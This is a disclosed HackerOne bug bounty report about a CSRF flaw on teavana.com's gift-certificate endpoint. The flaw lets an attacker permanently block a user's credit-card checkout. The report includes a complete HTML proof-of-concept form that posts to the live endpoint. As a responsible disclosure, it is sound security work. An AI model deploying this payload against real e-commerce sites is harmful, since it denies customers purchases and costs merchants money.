# Persistent CSRF in /GiftCert-AddToBasket prevents purchases on eCommerce sites

## Report Details
- **Report ID**: 206319
- **URL**: https://hackerone.com/reports/206319
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-02-14T11:44:45.802Z
- **Disclosed**: 2017-05-15T18:30:21.926Z

## Reporter
- **Username**: inhibitor181
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
SUMMARY
--------------
Hello, I have found an extremely interesting issue that can be used to permanently lock a user's possibility of ever buying anything from teavana.com by removing the credit card payment method.

POC
---------
CSRF snippet
```
<html>
	<head></head>
	<body>
		<form method="POST" id="GiftCertificateForm" action="http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-AddToBasket">
			<input class="textinput" id="dwfrm_giftcert_purchase_from" type="text" name="dwfrm_giftcert_purchase_from" value="Test whatever" maxlength="2147483647">
			<input class="textinput" id="dwfrm_giftcert_purchase_recipient" type="text" name="dwfrm_giftcert_purchase_recipient" value="Test whhhateever" maxlength="2147483647">
			<input class="textinput" id="dwfrm_giftcert_purchase_recipientEmail" type="text" name="dwfrm_giftcert_purchase_recipientEmail" value="valid@iamvalid.com" maxlength="2147483647">
			<input class="textinput" id="dwfrm_giftcert_purchase_confirmRecipientEmail" type="text" name="dwfrm_giftcert_purchase_confirmRecipientEmail" value="valid@iamvalid.com" maxlength="2147483647">
			<textarea class="textbox" id="dwfrm_giftcert_purchase_message" name="dwfrm_giftcert_purchase_message" rows="5" cols="50">Bla bla</textarea>
			<input class="textinput" id="dwfrm_giftcert_purchase_amount" type="text" name="dwfrm_giftcert_purchase_amount" value="100" maxlength="2147483647">
			<input type="submit" value="Send" />
		</form>
	</body>
</html>
```

DESCRIPTION
----------------
So, I just wanted to find demandware.store hidden links and in my search I stumbled across
```
http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-Purchase
```
From here, one can add custom gift cards in cart with a value between 5 and 5000 euros (or something like that). I have noticed that this is not CSRF protected, but this was a minor issue. Well, it became a serious problem after I noticed that after adding that gift card in my card, I wasn't able to fully empty my cart anymore and the credit card option was simply not available anymore and I wasn't able to fulfill any orders. Logging out and in doesn't do anything. Deleting cart product doesn't do anything. And because I tested teavana for some time, I know for a fact that the items in cart stay in cart (even after weeks).

So, I have made a new account, added the CSRF POC in a script then tested the flow and it worked. I have made my account unable to buy anything by adding that gift card in cart.

IMPACT
----------------
Permanently denying a user the possibility to fulfill with his account any orders is a very big issue (hence the High severity I personally find) and if someone launched an attack against you, you will lose customers and money (not to mention the potentially negative publicity)

Video POC attached.



## Attachments
No attachments
